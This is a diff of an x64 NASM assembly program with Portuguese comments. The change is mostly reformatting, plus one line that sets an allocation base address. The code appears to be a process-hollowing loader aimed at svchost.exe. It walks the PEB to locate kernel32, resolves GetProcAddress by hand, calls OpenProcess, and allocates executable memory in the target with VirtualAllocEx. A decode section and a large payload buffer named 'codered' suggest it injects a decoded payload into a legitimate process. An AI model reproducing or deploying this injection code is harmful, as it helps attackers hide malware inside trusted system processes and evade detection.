@@ -2,86 +2,89 @@
 global WinMain
 
 section .BSS
-	process db "svchost.exe",0,0	
+	process db "svchost.exe",0,0
+	
 section .data	
 	
-struc PROCESSINFO
-	.hProcess 			resd 2
-	.hThread 			resd 2
-        .dwProcessId 			resd 1
-        .dwThreadId 			resd 1
-endstruc
-			
-ProcInfo istruc PROCESSINFO
-	at PROCESSINFO.hProcess,	dd 0
-        at PROCESSINFO.hThread,		dd 0
-        at PROCESSINFO.dwProcessId,	dw 0
-        at PROCESSINFO.dwThreadId,	dw 0
-iend
+    struc PROCESSINFO
+	.hProcess 						resd 2
+	.hThread 						resd 2
+        .dwProcessId 						resd 1
+        .dwThreadId 						resd 1
+    endstruc
+	
 		
-struc STARTUPINFOA 
-        .cb resd 1
-        .lpReserved 			resb 8
-        .lpDesktop 			resb 8
-        .lpTitle 			resb 0xc
-        .dwX 				resd 1
-        .dwY 				resd 1
-        .dwXSize 			resd 1
-        .dwYSize 			resd 1
-        .dwXCountChars 			resd 1
-        .dwYCountChars 			resd 1
-        .dwFillAttribute 		resd 1
-        .dwFlags 			resd 1
-        .wShowWindow 			resw 1
-        .cbReserved2 			resw 2
-        .lpReserverd2 			resb 0xA
-        .hStdInput 			resd 2
-        .hStadOutput 			resd 2
-        .hStdError 			resd 2
+    ProcInfo istruc PROCESSINFO
+        at PROCESSINFO.hProcess,				dd 0
+        at PROCESSINFO.hThread,					dd 0
+        at PROCESSINFO.dwProcessId,				dw 0
+        at PROCESSINFO.dwThreadId,				dw 0
+    iend
+	
+	
+   struc STARTUPINFOA 
+        .cb 							resd 1
+        .lpReserved 						resb 8
+        .lpDesktop 						resb 8
+        .lpTitle 						resb 0xc
+        .dwX 							resd 1
+        .dwY 							resd 1
+        .dwXSize 						resd 1
+        .dwYSize 						resd 1
+        .dwXCountChars 						resd 1
+        .dwYCountChars 						resd 1
+        .dwFillAttribute 					resd 1
+        .dwFlags 						resd 1
+        .wShowWindow 						resw 1
+        .cbReserved2 						resw 2
+        .lpReserverd2 						resb 0xA
+        .hStdInput 						resd 2
+        .hStadOutput 						resd 2
+        .hStdError 						resd 2
     endstruc
 	
 
-startup istruc STARTUPINFOA 
-       at STARTUPINFOA.cb, 		dd 0
-       at STARTUPINFOA.lpReserved, 	db 0
-       at STARTUPINFOA.lpDesktop, 	db 0
-       at STARTUPINFOA.lpTitle, 	db 0
-       at STARTUPINFOA.dwX, 		dd 0
-       at STARTUPINFOA.dwY, 		dd 0
-       at STARTUPINFOA.dwXSize, 	dd 0
-       at STARTUPINFOA.dwYSize, 	dd 0
-       at STARTUPINFOA.dwXCountChars, 	dd 0
-       at STARTUPINFOA.dwYCountChars, 	dd 0
-       at STARTUPINFOA.dwFillAttribute, dd 0
-       at STARTUPINFOA.dwFlags, 	dd 0
-       at STARTUPINFOA.wShowWindow, 	dw 0
-       at STARTUPINFOA.cbReserved2, 	dw 0
-       at STARTUPINFOA.lpReserverd2, 	db 0
-       at STARTUPINFOA.hStdInput, 	dd 0
-       at STARTUPINFOA.hStadOutput, 	dd 0
-       at STARTUPINFOA.hStdError, 	dd 0
+    startup istruc STARTUPINFOA 
+       at STARTUPINFOA.cb, 					dd 0
+       at STARTUPINFOA.lpReserved, 				db 0
+       at STARTUPINFOA.lpDesktop, 				db 0
+       at STARTUPINFOA.lpTitle, 				db 0
+       at STARTUPINFOA.dwX, 					dd 0
+       at STARTUPINFOA.dwY, 					dd 0
+       at STARTUPINFOA.dwXSize, 				dd 0
+       at STARTUPINFOA.dwYSize, 				dd 0
+       at STARTUPINFOA.dwXCountChars, 				dd 0
+       at STARTUPINFOA.dwYCountChars, 				dd 0
+       at STARTUPINFOA.dwFillAttribute, 			dd 0
+       at STARTUPINFOA.dwFlags, 				dd 0
+       at STARTUPINFOA.wShowWindow, 				dw 0
+       at STARTUPINFOA.cbReserved2, 				dw 0
+       at STARTUPINFOA.lpReserverd2, 				db 0
+       at STARTUPINFOA.hStdInput, 				dd 0
+       at STARTUPINFOA.hStadOutput, 				dd 0
+       at STARTUPINFOA.hStdError, 				dd 0
     iend
 
-    	TamArqProgram times 8 		dq 0
-    	TamArqTarget times 8 		dq 0
-    	bufferFileName times 32 	db 0
-    	Buffer times 800000 		db 0
-    	addressAlocado times 8 		dq 0
-    	addressAlocadoEx times 8 	dq 0
-    	handle times 8 			dq 0
-    	entrypointTarget times 8 	dq 0
-	GetSizeTarget times 8 		dq 0
-	lpPebImageBase times 8 		dq 0
-	openProcessH times 8 		dq 0
-	lpContext times 8 		dd 0 
-	allocex times 8 		dd 0 
-	AddressEntryPoint times 8 	dd 0
-	PID times 8 			dd 0
-	alloc times 8 			dd 0
+    TamArqProgram times 8 					dq 0
+    TamArqTarget times 8 					dq 0
+    bufferFileName times 32 					db 0
+    Buffer times 800000 					db 0
+    addressAlocado times 8 					dq 0
+    addressAlocadoEx times 8 					dq 0
+    handle times 8 						dq 0
+    entrypointTarget times 8 					dq 0
+    GetSizeTarget times 8 					dq 0
+    lpPebImageBase times 8 					dq 0
+    openProcessH times 8 					dq 0
+    lpContext times 8 						dd 0 
+    allocex times 8 						dd 0 
+    AddressEntryPoint times 8 					dd 0
+    PID times 8 						dd 0
+    alloc times 8 						dd 0
 	
 section .codered
 	CodeRed:
-	Buffer2 times 800000 		db 0
+	Buffer2 times 800000 					db 0
 	
 section .deccode
 	decCode:
@@ -214,7 +217,7 @@ section .deccode
 		call r14
 		mov r12, rax
 		add rsp, 0x30
-	
+
 		;call OpenProcess
 		xor edx,edx
 		mov r8, [ProcInfo+PROCESSINFO.dwProcessId]
@@ -225,7 +228,7 @@ section .deccode
 		add rsp, 0x30
 		mov r13, rax
 		mov [openProcessH], rax
-		
+	
 	call Locate_kernel32
 	VirtualAllocEx:
 		;Lookup VirtualAllocEx
@@ -244,6 +247,7 @@ section .deccode
 		xor rcx,rcx
 		xor rbx,rbx
 		xor rdx,rdx
+		mov rdx, 0x400000
 		mov r8d, [GetSizeTarget]
 		mov r9d, 0x3000
 		mov [rsp+0x20], dword 0x40
@@ -334,6 +338,8 @@ section .deccode
 		call r12
 	;END
 	
+			
+ 
 section .text
 WinMain:
     Start:
@@ -399,8 +405,7 @@ ret
 ;***************
 ;*     AND     *
 ;***************
-
-
+		
 PrintMsgConsole:
 	; Lookup printf
 	mov rax, "printf"
@@ -469,7 +474,7 @@ OpenFile:
 	add rsp, 0x30
 	mov rbx,rax
 	add rsp, 0x10
-        
+
 LocomoveParaOFimDoarquivo:
 	;Lookup fseek
 	mov rax, "fseek"
@@ -489,7 +494,7 @@ LocomoveParaOFimDoarquivo:
 	call r12
 	add rsp, 0x30
 	add rsp, 0x08
-
+	
 GetSizeFile:
 	;Lookup ftell
 	mov rax, "ftell"
@@ -585,8 +590,8 @@ FechaArquivo:
 	call r12
 	add rsp, 0x30
 	add rsp, 0x08
-ret
-
+ ret
+         
 
 ;********************************
 ;* ABAIXO SÃO FUNÇÕES PARA USO  *
@@ -596,32 +601,32 @@ ret
 FinFunctionGetProcAddress:
 	mov rcx, r10; # Set loop counter
 	
-kernel32findfunction:  
-	jecxz FunctionNameFound; # Percorra esta função até encontrarmos GetProcA
-	xor ebx,ebx; # Zera EBX para ser usada
-	mov ebx, [r11+4+rcx*4]; # EBX = RVA para o primeiro AddressOfName
-	add rbx, r8; # RBX = Nome da funcao VMA
-	dec rcx; # Decrementa o loop em 1
-	mov rax, 0x41636f7250746547; # GetProcA
-	cmp [rbx], rax; # checa se rbx é igual a  GetProcA
-	jnz kernel32findfunction;  
+	kernel32findfunction:  
+		jecxz FunctionNameFound; # Percorra esta função até encontrarmos GetProcA
+		xor ebx,ebx; # Zera EBX para ser usada
+		mov ebx, [r11+4+rcx*4]; # EBX = RVA para o primeiro AddressOfName
+		add rbx, r8; # RBX = Nome da funcao VMA
+		dec rcx; # Decrementa o loop em 1
+		mov rax, 0x41636f7250746547; # GetProcA
+		cmp [rbx], rax; # checa se rbx é igual a  GetProcA
+		jnz kernel32findfunction;  
 
-; Encontra o endereço da função de GetProcessAddress
-FunctionNameFound:                 
-	; We found our target
-	xor r11, r11; 
-	mov r11d, [rdx+0x24];   # AddressOfNameOrdinals RVA
-	add r11, r8; # AddressOfNameOrdinals VMA
-	; Get the function ordinal from AddressOfNameOrdinals
-	inc rcx; 
-	mov r13w, [r11+rcx*2]; # AddressOfNameOrdinals + Counter. RCX = counter
-	; Get function address from AddressOfFunctions
-	xor r11, r11; 
-	mov r11d, [rdx+0x1c]; # AddressOfFunctions RVA
-	add r11, r8; # AddressOfFunctions VMA in R11. Kernel32+RVA for addressoffunctions
-	mov eax, [r11+4+r13*4]; # Get the function RVA.
-	add rax, r8; # Add base address to function RVA
-	mov r14, rax; # GetProcAddress to R14
+	; Encontra o endereço da função de GetProcessAddress
+	FunctionNameFound:                 
+		; We found our target
+		xor r11, r11; 
+		mov r11d, [rdx+0x24];   # AddressOfNameOrdinals RVA
+		add r11, r8; # AddressOfNameOrdinals VMA
+		; Get the function ordinal from AddressOfNameOrdinals
+		inc rcx; 
+		mov r13w, [r11+rcx*2]; # AddressOfNameOrdinals + Counter. RCX = counter
+		; Get function address from AddressOfFunctions
+		xor r11, r11; 
+		mov r11d, [rdx+0x1c]; # AddressOfFunctions RVA
+		add r11, r8; # AddressOfFunctions VMA in R11. Kernel32+RVA for addressoffunctions
+		mov eax, [r11+4+r13*4]; # Get the function RVA.
+		add rax, r8; # Add base address to function RVA
+		mov r14, rax; # GetProcAddress to R14
 ret
 
 LoadLibraryA:
@@ -679,7 +684,7 @@ GetProcAddres:
 	add r11, r8; # AddressOfNames VMA
 
 FinFunctionGetProcAddress2:
-mov rcx, r10; # Set loop counter
+	mov rcx, r10; # Set loop counter
 	kernel32findfunction2:  
 		jecxz FunctionNameFound2; # Percorra esta função até encontrarmos GetProcA
 		xor ebx,ebx; # Zera EBX para ser usada
@@ -689,9 +694,9 @@ mov rcx, r10; # Set loop counter
 		mov rax, 0x41636f7250746547; # GetProcA
 		cmp [rbx], rax; # checa se rbx é igual a  GetProcA
 		jnz kernel32findfunction2;  
-		
-		; Encontra o endereço da função de GetProcessAddress
-	FunctionNameFound2:                 
+	
+; Encontra o endereço da função de GetProcessAddress
+FunctionNameFound2:                 
 		; We found our target
 		xor r11, r11; 
 		mov r11d, [rdx+0x24]; # AddressOfNameOrdinals RVA
@@ -721,7 +726,7 @@ Locate_kernel32:
 	mov rbx, [rax + 0x20]; # RBX = Kernel32 base address
 	mov r8, rbx; # Copia o endereco base do Kernel32 para o registrador R8
 ret
-
+    
 IAT:
 ; Código para chegar na tabela de endereco de exportacao
 	mov ebx, [rbx+0x3C];# obtem o endereco da assinatura do  PE do Kernel32 e coloca em  EBX
